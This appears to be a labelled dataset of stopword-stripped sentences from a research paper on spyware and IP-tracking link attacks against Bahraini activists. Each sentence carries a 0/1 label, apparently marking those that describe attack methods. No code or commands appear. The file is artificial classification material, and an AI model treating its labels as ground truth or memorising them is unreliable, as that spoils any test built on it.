However proxy would show gaps global IPID forwarded traffic ; frequent observation strictly consecutive IPIDs thus contradicts statement	0
Exploitation captured data Since suspected spy- ware operator would likely seek exploit captured credentials particularly associated Bahraini activist organiza- tions worked Bahrain Watch activist organization inside Bahrain	0
Bahrain Watch established fake login page website provided us username pass- word	0
From clean VM logged using credentials saving password Mozilla Firefox	0
We infected VM FinSpy allowed connect Bahrain C & C server	1
Bahrain Watch 's website logs revealed subsequent hit 89.148.0.41-made however site 's home- page rather login page-coming shortly infected VM	0
Decrypting packet captures spyware's activity found VM sent password server exactly one minute earlier The URL provided server include path login page inaccessible home- page	0
This omission reflects fact Firefox password database stores domain names full login page URLs password	0
Repeating experiment yielded hit IP address within minute	0
We inspected Bahrain Watch 's logs showed subsequent ( previ- ous ) activity address instances User Agent string	0
In IP spy attack attacker aims discover IP address victim typically opera- tor pseudonymous social media e-mail account	1
The at- tacker sends pseudonymous account link webpage e-mail containing embedded remote image using one many freely-available services	1
When victim clicks link opens e-mail IP address revealed at- tacker	1
The attacker discovers victim 's identity ISP	0
In one case identified legal documents pro- vided circumstantial link spy link sub- sequent arrest	0
Figure 2 illustrates larger ecosystem attacks	0
The attackers appear represent single entity activity connects back accounts sent links shortened using par- ticular user account al9mood bit.ly URL shortening service	0
Recall Ali Faisal Al-Shufa ( discussed Section 1 ) accused sending insulting tweets account @ alkawarahnews ( Al Kawarah News Figure 2 )	0
An op- erator account forwarded us suspicious private message sent Al Kawarah News Facebook account Red Sky	0
Red Sky purportedly arrested 10/17/12 convicted insulting King Twitter account @ RedSky446 sentenced four months prison	0
When released found passwords Twitter Facebook e-mail accounts changed know recover accounts	0
The message Red Sky 's account sent Al Kawarah News included link shortened using Google 's goo.gl ser- vice	0
We used goo.gl API access analytics link finding unshortened iplogger.org/25SX created 12/8/12	0
The link received one click came Bahrain referrer www.facebook.com	0
Ali 's case files contained request Public Prose- cution information IP address linked Al Kawarah News 22 hours link created	0
Court documents indicate ISP data linked IP address Ali basis sentenced one year prison	0
Red Sky also targeted M Figure 2	0
M recalled click- ing link Red Sky using Internet connec- tion one houses M 's village	0
The house raided police 3/12/13 looking sub- scriber house 's internet connection	0
Police questioning revolved around Tweets referred Bahrain 's King '' cursed one	0
'' Red Sky earlier targeted users IP spy links shortened using al9mood bit.ly account	1
The attack Jehad Abdulla noteworthy ac- count 's activity aligned communities typically critical Bahrain 's opposition	0
However account also directly crit- icized King occasion one case referring '' weak '' '' stingy	0
'' An account linked al9mood sent Je- Abdulla IP spy link 10/2/12 public message	1
On 10/16/12 Salman Darwish arrested insulting King using Jehad Abdulla account	0
He sentenced one month prison partly basis confession	0
Salman's father claims police denied Salman food drink medi- cal care	0
Another account linked al9mood targeted @ YLUBH Twitter account Yokogawa Union trade union Bahraini branch Japanese company	0
@ YLUBH received least three IP spy links late 2012 sent via public Twitter mes sages	1
Yokogawa fired leader trade union Sami Ab- dulaziz Hassan 3/23/13	0
It later emerged Sami indeed operator @ YLUBH account police called questioning relation tweets	0
Use embedded remote images We identified several targets received spoofed e-mails containing embedded remote images	1
Figure 2 shows two cases Maryam Sayed Yousif	0
The attacker sent e-mails using ReadNotify.com records user 's IP address upon mail client downloading remote image	1
While ReadNotify.com forbids spoofing TOS service vulnerability known attackers ( confirmed ) allows spoofing From address directly setting parameters submission form website	0
We found evidence suggesting vulnerabil- ity publicly known appears clear attacker ex- ploited web form adds X-Mai1er RNwebmail header added sending ReadNotify.com's supported methods	0
The header appeared e-mail targets forwarded us	0
When spoofing using method original sender ad- dress still appears X-Sender headers	0
Accord- ing e-mails received targets came fatoomah85 @ gmail.com	0
A link sent one e- mails connected al9mood bit.ly account	0
In monitoring accounts connected al9mood counted 200 IP spy links Twitter messages public Facebook posts	0
Attackers often used ( 1 ) accounts promi- nent trusted jailed individuals like '' Red Sky '' ( 2 ) fake personas ( e.g. attractive women fake job seekers tar- geting labor union ) ( 3 ) impersonations legitimate ac- counts	1
